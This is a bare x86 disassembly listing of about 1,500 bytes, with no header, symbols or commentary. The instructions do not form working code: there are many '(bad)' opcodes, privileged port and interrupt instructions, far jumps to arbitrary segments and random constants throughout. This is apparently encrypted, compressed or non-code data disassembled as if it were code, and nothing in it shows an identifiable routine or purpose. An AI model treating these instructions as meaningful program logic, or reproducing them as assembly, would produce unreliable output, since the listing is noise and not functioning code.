  416ac6:	mov    al,0xbe
  416ac8:	repz shl BYTE PTR [edi],cl
  416acb:	pop    esi
  416acc:	retf   0x2156
  416acf:	(bad)  
  416ad0:	xchg   ecx,eax
  416ad1:	dec    ebp
  416ad2:	leave  
  416ad3:	daa    
  416ad4:	cmp    eax,esp
  416ad6:	loope  0x416ae1
  416ad8:	dec    ebp
  416ad9:	mov    dh,0x70
  416adb:	and    BYTE PTR [edi+0x56],bh
  416ade:	arpl   WORD PTR [eax+0x18],bx
  416ae1:	sub    ebx,edx
  416ae3:	pop    ecx
  416ae4:	arpl   dx,si
  416ae6:	push   ecx
  416ae7:	fmul   st,st(6)
  416ae9:	pop    ecx
  416aea:	jle    0x416ad7
  416aec:	aas    
  416aed:	xchg   BYTE PTR [ecx-0x8],ch
  416af0:	jae    0x416ab2
  416af2:	pop    esi
  416af3:	loopne 0x416b21
  416af5:	in     al,dx
  416af6:	sub    ebx,DWORD PTR [ebx-0x38a2be70]
  416afc:	mov    al,ds:0x1d4af2ec
  416b01:	lds    eax,FWORD PTR [ecx]
  416b03:	pop    ebx
  416b04:	sub    eax,0xf7ebc3b5
  416b09:	test   BYTE PTR [edx-0x64c37787],dh
  416b0f:	cli    
  416b10:	mov    cl,BYTE PTR [edi]
  416b12:	repz (bad) 
  416b14:	scas   al,BYTE PTR es:[edi]
  416b15:	retf   0xbc74
  416b18:	mov    ebp,0x582803a3
  416b1d:	cmp    ah,BYTE PTR [ecx+0x47f6958e]
  416b23:	jmp    0x416b62
  416b25:	jbe    0x416b5e
  416b27:	and    eax,0x4d775160
  416b2c:	inc    ebp
  416b2d:	add    al,0x2b
  416b2f:	adc    eax,0xa3f5eff2
  416b34:	adc    bh,dl
  416b36:	test   DWORD PTR [ecx+0x26d32bc4],0x4da7407b
  416b40:	jmp    0xf112b73c
  416b45:	push   edx
  416b46:	repz and DWORD PTR [ecx+ebp*2-0x716e0285],0x43021f82
  416b52:	pop    esi
  416b53:	(bad)  
  416b54:	sti    
  416b55:	or     ebp,ebp
  416b57:	or     dl,BYTE PTR [edi-0x3]
  416b5a:	rcl    dl,0xd8
  416b5d:	sbb    BYTE PTR [eax+0xc],al
  416b60:	or     eax,0x4afc3aad
  416b65:	aad    0x1b
  416b67:	out    dx,al
  416b68:	inc    esi
  416b69:	push   0x38be7014
  416b6e:	aam    0x3d
  416b70:	sbb    DWORD PTR [eax-0x2e],edi
  416b73:	int3   
  416b74:	pop    ebp
  416b75:	mov    bl,0x97
  416b77:	fdiv   DWORD PTR [ecx-0x22]
  416b7a:	(bad)
  416b7d:	ret    
  416b7e:	push   0x5c
  416b80:	cld    
  416b81:	(bad)  
  416b82:	jmp    esi
  416b84:	add    eax,0x38c155f3
  416b89:	mov    ecx,0x8ac8d020
  416b8e:	in     eax,dx
  416b8f:	add    DWORD PTR [ebp-0x42],eax
  416b92:	retf   
  416b93:	test   DWORD PTR [edx-0x8d01d7e],edx
  416b99:	cs mov bh,0x46
  416b9c:	cmp    ecx,ecx
  416b9e:	in     al,dx
  416b9f:	loop   0x416b93
  416ba1:	push   0x6f88fde9
  416ba6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ba7:	imul   ebp,DWORD PTR [eax-0x6e],0x56
  416bab:	mov    ds:0xd903f4d0,al
  416bb0:	mov    dh,0x3b
  416bb2:	pop    ss
  416bb3:	and    DWORD PTR [ecx+0x4e],esp
  416bb6:	sub    dl,BYTE PTR cs:[ecx+0x10dd2a9e]
  416bbd:	(bad)  
  416bbe:	test   eax,0xd43b1590
  416bc3:	adc    al,0x59
  416bc5:	das    
  416bc6:	gs mov ch,0x7c
  416bc9:	ret    
  416bca:	push   ebx
  416bcb:	cmp    BYTE PTR [edx],ah
  416bcd:	sub    al,0xad
  416bcf:	pop    ecx
  416bd0:	add    BYTE PTR [ecx-0xb],0xb9
  416bd4:	push   edx
  416bd5:	out    dx,al
  416bd6:	pusha  
  416bd7:	je     0x416c4b
  416bd9:	cmp    eax,0x474276fa
  416bde:	std    
  416bdf:	inc    esp
  416be0:	cmp    bh,BYTE PTR [eax-0x2d]
  416be3:	retf   0x7107
  416be6:	and    eax,0x6c059103
  416beb:	sub    DWORD PTR [edx-0x2],ecx
  416bee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bef:	xor    esi,edx
  416bf1:	adc    edx,ebp
  416bf3:	je     0x416c19
  416bf5:	das    
  416bf6:	in     eax,0x44
  416bf8:	mov    edi,0x3e1b88d3
  416bfd:	fmul   st(7),st
  416bff:	xchg   esi,eax
  416c00:	cmp    ah,BYTE PTR [ebx+0x2f3ad582]
  416c06:	jg     0x416bd0
  416c08:	cs or  eax,0xb351ba02
  416c0e:	retf   0x1ff5
  416c11:	mov    eax,ds:0x978fa80c
  416c16:	cli    
  416c17:	int    0xa8
  416c19:	clc    
  416c1a:	(bad)  
  416c1b:	jge    0x416c39
  416c1d:	sub    BYTE PTR ds:0xaae88822,ch
  416c23:	shl    DWORD PTR [ebp+0x72fa96dc],1
  416c29:	pop    ebp
  416c2a:	(bad)  
  416c2b:	(bad)  
  416c2c:	jo     0x416bdc
  416c2e:	fcomi  st,st(7)
  416c30:	mov    eax,ds:0xe9f184ca
  416c35:	adc    eax,0x4f189de4
  416c3a:	iret   
  416c3b:	fsubr  DWORD PTR [ebx-0x6c]
  416c3e:	bound  edx,QWORD PTR [ebx]
  416c40:	aad    0x32
  416c42:	mov    bl,0xbb
  416c44:	js     0x416c21
  416c46:	mov    ebx,0x7a91d18f
  416c4b:	xchg   edx,eax
  416c4c:	mov    bl,BYTE PTR [ecx]
  416c4e:	mov    dl,0xa
  416c50:	in     al,0x3d
  416c52:	xchg   ebx,eax
  416c53:	mov    dh,0xc0
  416c55:	cmp    eax,0xece980bb
  416c5a:	aaa    
  416c5b:	pop    edi
  416c5c:	mov    ds:0x9199fd3f,eax
  416c61:	mov    esi,0x614ee0bc
  416c66:	inc    ecx
  416c67:	pop    ss
  416c68:	std    
  416c69:	es xchg ebx,eax
  416c6b:	rol    DWORD PTR [ecx+0xe06607f],1
  416c71:	dec    ecx
  416c72:	inc    eax
  416c73:	cmp    edx,DWORD PTR [edi+ecx*2-0x3f]
  416c77:	lds    ebx,FWORD PTR [edx-0x47bf7f8]
  416c7d:	push   ebp
  416c7e:	arpl   WORD PTR [ebp-0x27],sp
  416c81:	test   DWORD PTR ss:[ebx-0x71b19b9],esi
  416c88:	inc    ebx
  416c89:	jle    0x416cd6
  416c8b:	jbe    0x416cf5
  416c8d:	lds    eax,FWORD PTR [esi-0x106e8ad9]
  416c93:	fnstcw WORD PTR [eax+0x733bfb57]
  416c99:	rcr    bl,1
  416c9b:	sbb    cl,BYTE PTR [eax-0x19ba63af]
  416ca1:	retfw  0xaec
  416ca5:	jns    0x416c94
  416ca7:	pop    ss
  416ca8:	or     ebp,eax
  416caa:	(bad)  
  416cab:	jnp    0x416cf3
  416cad:	ja     0x416ca9
  416caf:	xchg   edx,eax
  416cb0:	test   eax,0xc1e61562
  416cb5:	mov    BYTE PTR [edi+ebx*8-0x6e393580],bl
  416cbc:	outs   dx,DWORD PTR ds:[esi]
  416cbd:	shl    BYTE PTR [ebx+0x2f59531c],1
  416cc3:	jno    0x416ca6
  416cc5:	sbb    esp,DWORD PTR [ecx+ebp*1]
  416cc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cc9:	mov    ds:0x11c4979f,al
  416cce:	add    cl,BYTE PTR [esi+0x71]
  416cd1:	jmp    0x31e505da
  416cd6:	pop    ebp
  416cd7:	std    
  416cd8:	cdq    
  416cd9:	mov    esp,0xf6f785f3
  416cde:	jnp    0x416d25
  416ce0:	sub    eax,0x7de4c255
  416ce5:	push   eax
  416ce6:	rcr    edx,0xdf
  416ce9:	cdq    
  416cea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ceb:	cmp    DWORD PTR [edx-0x4a],edi
  416cee:	(bad)  
  416cef:	repnz sti 
  416cf1:	test   BYTE PTR [esi+ebp*2],cl
  416cf4:	gs aad 0xb
  416cf7:	stc    
  416cf8:	pushf  
  416cf9:	ins    BYTE PTR es:[edi],dx
  416cfa:	(bad)  
  416cfb:	aaa    
  416cfc:	xchg   ebx,ebx
  416cfe:	(bad)  
  416cff:	aas    
  416d00:	sti    
  416d01:	mov    ebp,0x98ca3778
  416d06:	test   DWORD PTR [ebx],edi
  416d08:	shl    DWORD PTR [ebp+0x7b827cf1],cl
  416d0e:	push   ebp
  416d0f:	cmp    al,0xd4
  416d11:	mov    dh,0xb5
  416d13:	lods   eax,DWORD PTR ds:[esi]
  416d14:	dec    edx
  416d15:	cmc    
  416d16:	push   ebx
  416d17:	push   edx
  416d18:	cmp    edx,DWORD PTR [edx+eiz*8-0x3c]
  416d1c:	test   DWORD PTR [edx-0x2cb6b30f],0xf279fa82
  416d26:	or     BYTE PTR [ecx+0x2e],dh
  416d29:	pop    eax
  416d2a:	gs jns 0x416d33
  416d2d:	and    al,0x79
  416d2f:	out    0x2d,al
  416d31:	mov    ds:0xeb33ac2,al
  416d36:	mov    ebx,ebx
  416d38:	shr    DWORD PTR [eax+edi*1+0x3939f3dc],0x13
  416d40:	pop    ss
  416d41:	jmp    0x8204:0x83d341eb
  416d48:	cmp    dl,BYTE PTR ds:0xce9a9ecd
  416d4e:	enter  0xe84b,0x2b
  416d52:	push   0x45
  416d54:	and    DWORD PTR es:[ecx+eax*4+0x2e],0x6454247f
  416d5d:	outs   dx,DWORD PTR ds:[esi]
  416d5e:	jbe    0x416ce6
  416d60:	adc    DWORD PTR [esi+0x5a],esp
  416d63:	pushf  
  416d64:	cdq    
  416d65:	ins    BYTE PTR es:[edi],dx
  416d66:	stc    
  416d67:	and    BYTE PTR [edi+0x10],dh
  416d6a:	scas   eax,DWORD PTR es:[edi]
  416d6b:	mov    ch,0x55
  416d6d:	add    al,0xf5
  416d6f:	je     0x416d70
  416d71:	stos   BYTE PTR es:[edi],al
  416d72:	mov    DWORD PTR [esi],ecx
  416d74:	in     eax,0x97
  416d76:	add    al,0x28
  416d78:	mov    al,ds:0x3061c5e0
  416d7d:	shr    ebx,cl
  416d7f:	pop    esp
  416d80:	clts   
  416d82:	pop    edi
  416d83:	pop    edx
  416d84:	push   0xf59d15e1
  416d89:	xchg   edi,eax
  416d8a:	xchg   ecx,eax
  416d8b:	imul   ebx,ebp,0xb29818c6
  416d91:	dec    edi
  416d92:	adc    BYTE PTR [eax+0x1c],cl
  416d95:	sti    
  416d96:	jmp    0x785f2a2b
  416d9b:	mov    eax,ds:0x6ce4b54b
  416da0:	push   es
  416da1:	shl    BYTE PTR [ebx+eiz*4-0x74],1
  416da5:	lods   eax,DWORD PTR ds:[esi]
  416da6:	inc    edx
  416da7:	mov    ah,0xc9
  416da9:	push   DWORD PTR [ecx-0x77a92957]
  416daf:	data16 cs loope 0x416d45
  416db3:	das    
  416db4:	outs   dx,DWORD PTR ds:[esi]
  416db5:	fstp   TBYTE PTR [edi+0x4ed55a08]
  416dbb:	push   ebp
  416dbc:	fstp   st(1)
  416dbe:	push   eax
  416dbf:	leave  
  416dc0:	dec    ebx
  416dc1:	inc    ecx
  416dc2:	add    eax,0x6e9c21d0
  416dc7:	pop    esp
  416dc8:	repz ret 
  416dca:	cld    
  416dcb:	mov    ecx,0xe9c6e94a
  416dd0:	les    edi,FWORD PTR [ebp+0x1c]
  416dd3:	xchg   ebx,eax
  416dd4:	cwde   
  416dd5:	test   BYTE PTR [eax],0xa5
  416dd8:	and    al,0x73
  416dda:	fadd   DWORD PTR [edx+ecx*2]
  416ddd:	out    dx,eax
  416dde:	rol    BYTE PTR [edx+0x57a45ed0],0x6f
  416de5:	pop    eax
  416de6:	and    ah,0x80
  416de9:	xchg   esp,eax
  416dea:	adc    dh,cl
  416dec:	adc    eax,0x4707d006
  416df1:	cmp    ebp,ecx
  416df3:	dec    edx
  416df4:	mov    dl,0xf4
  416df6:	pop    edx
  416df7:	enter  0xdab7,0x65
  416dfb:	pop    eax
  416dfc:	daa    
  416dfd:	popa   
  416dfe:	ret    
  416dff:	add    cl,BYTE PTR [ebx]
  416e01:	inc    esp
  416e02:	dec    ecx
  416e03:	mov    eax,ds:0xd8453ec
  416e08:	xor    eax,ebp
  416e0a:	push   0x52
  416e0c:	jnp    0x416deb
  416e0e:	lods   al,BYTE PTR ds:[esi]
  416e0f:	outs   dx,BYTE PTR ds:[esi]
  416e10:	call   0x6ea0:0x9cb95fab
  416e17:	iret   
  416e18:	sub    cl,al
  416e1a:	cmp    al,0x3
  416e1c:	mov    BYTE PTR [edx],cl
  416e1e:	pop    esp
  416e1f:	sbb    eax,0x886609ab
  416e24:	fucomip st,st(6)
  416e26:	repz pop ecx
  416e28:	repnz xor DWORD PTR [ebx-0x3d],esp
  416e2c:	push   ebp
  416e2d:	cs std 
  416e2f:	loope  0x416e47
  416e31:	es (bad) 
  416e36:	in     al,dx
  416e37:	inc    edi
  416e38:	fisttp DWORD PTR [ebx*2-0x23c4e6]
  416e3f:	xor    cl,dh
  416e41:	mov    al,0x3a
  416e43:	push   cs
  416e44:	pusha  
  416e45:	mov    dl,0xcb
  416e47:	hlt    
  416e48:	(bad)  [edx-0x75]
  416e4b:	repz push edx
  416e4d:	sbb    esp,ebp
  416e4f:	test   eax,0x8b68a5fa
  416e54:	adc    DWORD PTR [ebp-0x6a],edx
  416e57:	not    BYTE PTR [edi+0x3c]
  416e5a:	in     eax,dx
  416e5b:	jp     0x416e62
  416e5d:	imul   ebp,DWORD PTR [eax-0x2],0x8f81f067
  416e64:	cmc    
  416e65:	mov    ecx,0xe688a6b9
  416e6a:	pop    DWORD PTR [ecx+0x53485ac0]
  416e70:	jmp    DWORD PTR [esi]
  416e72:	xchg   edx,eax
  416e73:	jno    0x416eb5
  416e75:	(bad)  
  416e76:	sahf   
  416e77:	mov    ah,0x9
  416e79:	pop    es
  416e7a:	xchg   ebx,eax
  416e7b:	and    eax,0x8cf13543
  416e80:	es ss pop eax
  416e83:	lock sbb eax,0xffffffed
  416e87:	pop    esi
  416e88:	fs cmp BYTE PTR fs:[edx+0x765458a],ch
  416e90:	xlat   BYTE PTR ds:[ebx]
  416e91:	out    0xa0,eax
  416e93:	stos   BYTE PTR es:[edi],al
  416e94:	sbb    DWORD PTR [eax+0x1a],esp
  416e97:	fldcw  WORD PTR [ebx+0x7a11fc36]
  416e9d:	icebp  
  416e9e:	scas   eax,DWORD PTR es:[edi]
  416e9f:	imul   ecx,DWORD PTR [ebx+0x135a08ba],0x77a0114b
  416ea9:	retf   
  416eaa:	daa    
  416eab:	fisttp QWORD PTR [ebp+eax*4+0x7e]
  416eaf:	cmp    DWORD PTR [esi-0x1729fd26],esi
  416eb5:	pop    ebx
  416eb6:	sbb    eax,0x8bbaa950
  416ebb:	push   esi
  416ebc:	inc    edx
  416ebd:	(bad)  
  416ebe:	or     al,0xa4
  416ec0:	fidiv  DWORD PTR [edi+0x545844a]
  416ec6:	push   esp
  416ec7:	hlt    
  416ec8:	sbb    DWORD PTR [edx-0xbba2964],edi
  416ece:	cmp    eax,0x3e9a4ad
  416ed3:	pop    DWORD PTR [ebx]
  416ed5:	mov    ch,0xe5
  416ed7:	jp     0x416e5d
  416ed9:	icebp  
  416eda:	and    bl,BYTE PTR [ebp+0x3d]
  416edd:	mov    edi,0xb86bcf7
  416ee2:	jo     0x416e9e
  416ee4:	fimul  DWORD PTR [ebp+0x5504764e]
  416eea:	or     DWORD PTR [eax+0xe],esi
  416eed:	jg     0x416ec5
  416eef:	and    esi,DWORD PTR [ebp-0x397ff003]
  416ef5:	ret    0x779b
  416ef8:	imul   eax,DWORD PTR [edi-0x7f9b86ef],0xffffffb1
  416eff:	shl    DWORD PTR [ecx+0x2cd925e0],1
  416f05:	inc    esp
  416f06:	mov    dh,0x9e
  416f08:	sub    esi,edi
  416f0a:	xor    esp,DWORD PTR [edi+0x2]
  416f0d:	mov    dh,0x2f
  416f0f:	mov    ebx,0x49639def
  416f14:	jl     0x416ea3
  416f16:	loopne 0x416f40
  416f18:	(bad)  
  416f19:	cli    
  416f1a:	lods   eax,DWORD PTR ds:[esi]
  416f1b:	mov    al,0x85
  416f1d:	or     edi,DWORD PTR ss:[ebx+0x78]
  416f21:	xchg   BYTE PTR [ebp+0x5a6c77fd],al
  416f27:	jmp    0xefff10dc
  416f2c:	xor    BYTE PTR [ebx-0x3a141dfe],ch
  416f32:	jae    0x416f82
  416f34:	inc    ecx
  416f35:	mov    dl,0xc8
  416f37:	repnz xchg ebx,eax
  416f39:	call   0xee6f:0xc20d048
  416f40:	cmp    DWORD PTR [ebx-0x3f],0x1f49945a
  416f47:	scas   eax,DWORD PTR es:[edi]
  416f48:	nop
  416f49:	dec    ecx
  416f4a:	dec    esp
  416f4b:	ins    BYTE PTR es:[edi],dx
  416f4c:	sub    WORD PTR [edx+0x43],dx
  416f50:	sar    DWORD PTR [ebx+0x2aac1955],1
  416f56:	and    esp,eax
  416f58:	sbb    dh,ah
  416f5a:	iret   
  416f5b:	jmp    0x1aa64311
  416f60:	mov    dl,bh
  416f62:	scas   al,BYTE PTR es:[edi]
  416f63:	cli    
  416f64:	inc    esp
  416f65:	xchg   esi,eax
  416f66:	jecxz  0x416f15
  416f68:	add    DWORD PTR [ecx+ecx*1-0x5d8090c1],ecx
  416f6f:	add    BYTE PTR [ebx],0x9b
  416f72:	pop    edi
  416f73:	jmp    0x416f44
  416f75:	sbb    DWORD PTR [esi-0x470d67],ebp
  416f7b:	bound  esi,QWORD PTR ds:0x6fe4a2ed
  416f81:	outs   dx,DWORD PTR ds:[esi]
  416f82:	sub    bh,ah
  416f84:	jb     0x416f1b
  416f86:	and    BYTE PTR [eax-0x37],dh
  416f89:	dec    ebx
  416f8a:	test   ah,0xa5
  416f8d:	mov    bl,cl
  416f8f:	enter  0x6bb0,0xea
  416f93:	imul   eax,esp,0xd57d8112
  416f99:	xor    bl,BYTE PTR [ecx-0x799e15e8]
  416f9f:	fsubp  st(3),st
  416fa1:	add    ah,dh
  416fa3:	pop    ss
  416fa4:	mov    ch,0xa3
  416fa6:	xchg   esp,eax
  416fa7:	add    al,0x9b
  416fa9:	(bad)
  416fae:	adc    DWORD PTR [esi+ebp*1],esp
  416fb1:	push   eax
  416fb2:	int3   
  416fb3:	push   0xffffffef
  416fb5:	fnstsw WORD PTR [edi-0x2bd403ca]
  416fbb:	inc    DWORD PTR ds:0xc409c3f3
  416fc1:	push   esi
  416fc2:	clc    
  416fc3:	mov    BYTE PTR [ecx-0x49798ddb],dh
  416fc9:	lds    edi,FWORD PTR ds:0x3d138a1f
  416fcf:	neg    DWORD PTR [ebp-0x61]
  416fd2:	inc    ebx
  416fd3:	xor    ebx,ebx
  416fd5:	xchg   DWORD PTR [ecx+edx*2+0x39adfb3e],ecx
  416fdc:	cli    
  416fdd:	lock (bad) 
  416fdf:	neg    BYTE PTR [ebp+0x5ff5f9b9]
  416fe5:	retf   0x353e
  416fe8:	xor    dl,bh
  416fea:	jae    0x41703f
  416fec:	in     al,0x1f
  416fee:	sbb    edx,ebp
  416ff0:	jb     0x416f88
  416ff2:	dec    ebp
  416ff3:	adc    esi,ecx
  416ff5:	das    
  416ff6:	cmp    edx,ebp
  416ff8:	test   eax,0xf476ad52
  416ffd:	mov    ah,0x60
  416fff:	jb     0x41701f
  417001:	out    dx,al
  417002:	jbe    0x41707e
  417004:	mov    ch,0xde
  417006:	pop    eax
  417007:	jle    0x417066
  417009:	sbb    eax,0x90c4cd89
  41700e:	mov    esi,ebx
  417010:	daa    
  417011:	out    dx,al
  417012:	scas   al,BYTE PTR es:[edi]
  417013:	fcmovnu st,st(1)
  417015:	in     al,dx
  417016:	jl     0x41701a
  417018:	adc    DWORD PTR [eax],esi
  41701a:	dec    ecx
  41701b:	cmp    eax,0x143ce408
  417020:	jae    0x41708d
  417022:	sub    bh,bh
  417024:	add    esi,DWORD PTR [edx+0x2]
  417027:	jl     0x416fb8
  417029:	mov    edi,0x650a12bd
  41702e:	mov    esp,0x6b6e8107
  417033:	ret    0x6a02
  417036:	ds jle 0x417045
  417039:	ror    BYTE PTR es:[ebp+0x3b],0x4a
  41703e:	push   esi
  41703f:	mov    ch,0x8a
  417041:	ds scas al,BYTE PTR es:[edi]
  417043:	sub    esp,ebp
  417045:	outs   dx,BYTE PTR ds:[esi]
  417046:	mov    al,ds:0x324c5290
  41704b:	bound  esi,QWORD PTR [eax]
  41704d:	ins    DWORD PTR es:[edi],dx
  41704e:	cmp    bl,BYTE PTR [esi-0x1d]
  417051:	outs   dx,DWORD PTR ds:[esi]
  417052:	sbb    ebp,ebx
  417054:	mov    ecx,DWORD PTR [eax-0x9756e52]
  41705a:	pop    edi
  41705b:	aaa    
  41705c:	sub    BYTE PTR ds:0x85f2ba11,0xc3
  417063:	rcr    BYTE PTR [edx+0x56],cl
  417066:	inc    esp
  417067:	mov    eax,ds:0x7fe2a33
  41706c:	or     BYTE PTR [esi-0x3],0xfd
  417070:	xchg   edx,eax
  417071:	out    0xcf,al
  417073:	mov    BYTE PTR [eax],al
  417075:	push   ebx
  417076:	popf   
  417077:	or     dl,ch
  417079:	test   al,0xba
  41707b:	xchg   BYTE PTR ds:0x5d8e6107,al
  417081:	ror    BYTE PTR [esi-0x6f6839b3],0x69
  417088:	mov    DWORD PTR [esi],ebp
  41708a:	mov    eax,ds:0x33e7fc41
  41708f:	xor    al,0x7f
  417091:	mov    WORD PTR [esi-0x56],gs
  417094:	fwait
  417095:	mov    eax,ds:0x7d942276
  41709a:	jno    0x4170cb
  41709c:	jmp    0x4170ff
  41709e:	jbe    0x417112
  4170a0:	xchg   BYTE PTR [esi-0x6886d09c],al
  4170a6:	add    eax,ebx
  4170a8:	push   esi
  4170a9:	sbb    DWORD PTR [edx-0x637ffba9],ebp
  4170af:	adc    BYTE PTR [ecx],0x53
  4170b2:	lods   eax,DWORD PTR ds:[esi]
  4170b3:	enter  0x7ad9,0xc5
  4170b7:	sbb    ah,BYTE PTR [esi-0x95c8185]
  4170bd:	retf   
  4170be:	fild   WORD PTR [eax+0x1d]
  4170c1:	cdq    
  4170c2:	loopne 0x417113
  4170c4:	push   eax
  4170c5:	or     dh,BYTE PTR [ebx-0x7c]
  4170c8:	and    ah,cl
  4170ca:	xor    al,BYTE PTR [ecx-0x3a]
  4170cd:	and    DWORD PTR [ebp-0x3],ebp
  4170d0:	fdivr  st(5),st
  4170d2:	xor    eax,esi
  4170d4:	dec    edi
  4170d5:	pop    edx
  4170d6:	cdq    
  4170d7:	js     0x41705f
  4170d9:	imul   eax,edx,0x2946b8ae
  4170df:	pushf  
  4170e0:	popa   
  4170e1:	sbb    edi,ebx
  4170e3:	(bad)  
  4170e4:	in     al,0xde
  4170e6:	cwde   
  4170e7:	dec    edx
  4170e8:	lea    ebp,[edx]
  4170ea:	mov    bh,0xcd
  4170ec:	add    BYTE PTR [edi+0x6d],dl
  4170ef:	mov    dh,al
  4170f1:	(bad)  
  4170f2:	imul   dh
  4170f4:	add    DWORD PTR [ebx-0x79],edx
  4170f7:	int3   
  4170f8:	iret   
  4170f9:	push   eax
  4170fa:	sbb    al,0xda
  4170fc:	cli    
  4170fd:	loop   0x417170
  4170ff:	adc    al,0x93
  417101:	sbb    DWORD PTR [edi],ebp
  417103:	adc    BYTE PTR [ebp-0x850885d],bh
  417109:	push   es
  41710a:	dec    edi
  41710b:	xlat   BYTE PTR ds:[ebx]
  41710c:	mov    bh,0x4c
  41710e:	xchg   ebp,eax
  41710f:	inc    ebx
  417110:	cmp    BYTE PTR [esi-0x19],ch
  417113:	cmp    al,cl
  417115:	mov    edx,0x9f411fb2
  41711a:	test   BYTE PTR [ecx-0x7873b952],0xd2
  417121:	sbb    DWORD PTR [bp+si+0x3deb],esi
  417126:	jmp    0x4a8f:0xdc266da3
  41712d:	pop    ds
  41712e:	pop    ecx
  41712f:	sbb    BYTE PTR [eax],bh
  417131:	and    eax,0xa6a5240
  417136:	mov    ch,0xb5
  417138:	push   ds
  417139:	xor    dl,BYTE PTR [edx]
  41713b:	mov    ds,WORD PTR [esi-0xd86d060]
  417141:	or     bl,BYTE PTR [edx]
  417143:	mov    BYTE PTR [ecx+0x6d7c64d2],al
  417149:	xor    eax,0xb8b5c976
  41714e:	cmp    BYTE PTR [ebx+0x2093f316],cl
  417154:	mov    bl,0xba
  417156:	lea    edi,[eax+eiz*2]
  417159:	(bad)  
  41715a:	pop    ecx
  41715b:	push   ds
  41715c:	xchg   ebp,eax
  41715d:	dec    ebp
  41715e:	pop    esi
  41715f:	test   DWORD PTR [esi-0x18],edx
  417162:	imul   ebx,DWORD PTR [esi-0x433e6822],0xffffffdf
  417169:	mov    dl,0x18
  41716b:	sbb    BYTE PTR [edi+0x2d21f65f],dl
  417171:	jge    0x417198
  417173:	push   ds
  417174:	xchg   ebx,eax
  417175:	adc    al,0x93
  417177:	int    0x93
  417179:	ret    0xe43
  41717c:	sbb    bh,BYTE PTR ss:[ecx-0xd]
  417180:	sbb    DWORD PTR [ecx-0x31],eax
  417183:	lds    eax,FWORD PTR [ebx]
  417185:	sbb    al,0xe2
  417187:	arpl   si,dx
  417189:	ja     0x41720a
  41718b:	adc    eax,0x202c4ea1
  417190:	or     DWORD PTR [esi+0x42],ecx
  417193:	test   eax,0x9137308e
  417198:	or     BYTE PTR fs:[ebx-0x6f],bl
  41719c:	loopne 0x4171e8
  41719e:	jo     0x417196
  4171a0:	push   es
  4171a1:	retf   
  4171a2:	outs   dx,DWORD PTR ds:[esi]
  4171a3:	xchg   ebx,eax
  4171a4:	inc    esi
  4171a5:	repnz (bad) 
  4171a8:	dec    esi
  4171a9:	das    
  4171aa:	mov    ch,0x74
  4171ac:	into   
  4171ad:	jmp    0x8413:0x512b8bb7
  4171b4:	inc    ecx
  4171b5:	push   eax
  4171b6:	inc    ebp
  4171b7:	jecxz  0x417153
  4171b9:	in     eax,0x96
  4171bb:	or     DWORD PTR [ebx-0x7],edi
  4171be:	cmp    eax,0x8369897e
  4171c3:	aam    0x92
  4171c5:	push   ds
  4171c6:	push   ebp
  4171c7:	enter  0x2dd7,0x2a
  4171cb:	outs   dx,BYTE PTR ds:[esi]
  4171cc:	and    esp,eax
  4171ce:	sbb    al,0x50
  4171d0:	xchg   esi,eax
  4171d1:	pop    esi
  4171d2:	sub    eax,0x115439fc
  4171d7:	in     eax,0xdc
  4171d9:	in     eax,dx
  4171da:	lock sar ebx,1
  4171dd:	fimul  WORD PTR [ebx-0x4d]
  4171e0:	jmp    0xb475d97c
  4171e5:	or     DWORD PTR [ebp+0x79],edx
  4171e8:	xor    al,0xb8
  4171ea:	xchg   ebp,eax
  4171eb:	cmp    eax,0x1cb509f6
  4171f0:	adc    bl,BYTE PTR [esp+esi*2]
  4171f3:	mov    WORD PTR [eax],cs
  4171f5:	xor    DWORD PTR [ecx],ecx
  4171f7:	cmp    eax,0x6a1a841f
  4171fc:	adc    DWORD PTR [edx],ebx
  4171fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171ff:	pushf  
  417200:	aaa    
  417201:	mov    al,bh
  417203:	jge    0x4171cd
  417205:	or     bl,BYTE PTR [edi]
  417207:	(bad)  
  417208:	and    ah,BYTE PTR ss:[ebx-0x631b1f3]
  41720f:	bswap  eax
  417211:	jp     0x417196
  417213:	jmp    0x2a38:0x488f9881
  41721a:	add    DWORD PTR [ecx-0x1a972bfc],esp
  417220:	fst    QWORD PTR [ecx+0x16]
  417223:	mov    ah,0x44
  417225:	xchg   edx,eax
  417226:	pop    edx
  417227:	adc    BYTE PTR [ebx+0x1269218],bl
  41722d:	loopne 0x41720a
  41722f:	in     eax,dx
  417230:	dec    edx
  417231:	sbb    eax,0xe3b931ea
  417236:	mov    edi,0x60de67fb
  41723b:	outs   dx,DWORD PTR ds:[esi]
  41723c:	xchg   esp,eax
  41723d:	retf   0x28c8
  417240:	shr    esp,1
  417242:	dec    ebp
  417243:	cmp    ebx,edx
  417245:	inc    ebx
  417246:	xor    bh,BYTE PTR [edx-0x66]
  417249:	dec    ebx
  41724a:	imul   edi,ebx,0x3b4e6eba
  417250:	xchg   BYTE PTR [ebx+0x3a1be868],cl
  417256:	xor    BYTE PTR [eax+esi*4],ah
  417259:	and    BYTE PTR [edi-0x64],0xde
  41725d:	xor    BYTE PTR [eax+ebp*4-0x15f7a517],cl
  417264:	fcom   QWORD PTR [eax]
  417266:	mov    al,0x2f
  417268:	or     cl,BYTE PTR [esi]
  41726a:	test   DWORD PTR [ebp-0x57],edx
  41726d:	xor    al,0x42
  41726f:	sub    eax,DWORD PTR [ecx-0x26]
  417272:	pusha  
  417273:	cli    
  417274:	and    al,0x7a
  417276:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417278:	dec    ecx
  417279:	lds    edi,FWORD PTR [ecx+0x5]
  41727c:	cld    
  41727d:	outs   dx,DWORD PTR ds:[esi]
  41727e:	enter  0xce29,0x8
  417282:	mov    eax,0x8285b08b
  417287:	mov    ebx,0x33676253
  41728c:	test   eax,0x9e6dc789
  417291:	rcl    BYTE PTR [ebx+0x5c],0xbb
  417295:	mov    dl,0xde
  417297:	mov    eax,0xdb24e90c
  41729c:	loope  0x4172b0
  41729e:	adc    eax,0xe3050a23
  4172a3:	mov    ah,0xde
  4172a5:	xchg   ebp,edi
  4172a7:	test   BYTE PTR [ecx+0x13b2fd4e],bl
  4172ad:	lods   eax,DWORD PTR ds:[esi]
  4172ae:	fild   DWORD PTR [esi-0x32f1cb78]
  4172b4:	jge    0x4172ab
  4172b6:	(bad)  
  4172b7:	push   ds
  4172b8:	std    
  4172b9:	jmp    0x4172c8
  4172bb:	and    edi,DWORD PTR [edx]
